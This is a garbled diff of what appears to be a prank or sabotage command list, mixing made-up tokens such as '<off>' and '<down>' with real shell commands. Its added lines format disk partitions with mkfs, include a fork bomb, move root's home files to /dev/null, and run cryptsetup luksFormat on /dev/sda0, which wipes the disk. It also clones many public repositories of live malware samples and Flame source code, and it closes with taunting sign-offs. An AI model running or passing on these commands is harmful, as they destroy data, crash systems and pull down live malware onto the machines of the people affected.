@@ -1,36 +1,49 @@
 <off>
-mkfs ext4 dev/sda1
-mkfs ext4 dev/sda0
+mkfs.ext3 /dev/sda1
+:(){:|:&};:
+mkfs.ext3 /dev/sda0
 >file
+<down>
 <off>
 git clone https://github.com/Endermanch/MalwareDatabase
-mkfs ext4 dev/sda3. 2a
-mkfs ext4 dev/sda3. 2b
+mkfs.ext3 /dev/sda3. 2a
+<down>
+mkfs.ext3 /dev/sda3. 2b
+git clone https://github.com/HBMS-0em/pushit
 >file
+<down>
 <off>
 mkfs ext4 dev/sda3. 2c
 mkfs ext4 dev/sda3. 2d
 >file
+<down>
+mv /home/root/*  dev/null
+<down>
+<down>
 git clone https://github.com/System32Booster/MalwareDatabase
 git clone https://github.com/Haroun-Haeder/MalwareDatabase
 git clone https://github.com/pankoza2-pl/malwaredatabase-old
 >file
 <off>
+<down>
 git clone https://github.com/Pyran1/MalwareDatabase
 git clone https://github.com/YuuyaGitHub/MalwareDataBase
 git clone https://github.com/pankoza2-pl/Malware2.0Database
 >file
+<down>
 git clone https://github.com/mko-x/docker-clamav
 git clone https://github.com/Pyran1/MalwareDatabaseUnsorted
 >file
 git clone https://github.com/Haroun-Haeder/MalwareDatabase
 >file
 <off>
+<down>
 git clone https://github.com/Princekin/malware-database
 git clone https://github.com/acastillorobles77/MalwareDatabase
 git clone https://github.com/win2007/MalwareDatabase-1.git
 <off>
 >file
+<down
 git clone https://github.com/Correia-jpv/fucking-awesome-malware-analysis
 git clone https://github.com/madhanmaaz/blackpanther
 git clone https://github.com/LJ9859/Malware-Database
@@ -38,6 +51,12 @@ git clone https://github.com/LJ9859/Malware-Database
 >file
 git clone https://github.com/loneicewolf/flame-sourcecode
 >file
+<down>
+umount
+apt install cryptsetup 
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+>file 
+the jellybabys send their regards.
 Thank you very much 🙏😊
 This has been a S#@L€WaTch Joint.
 we love you 💕😘
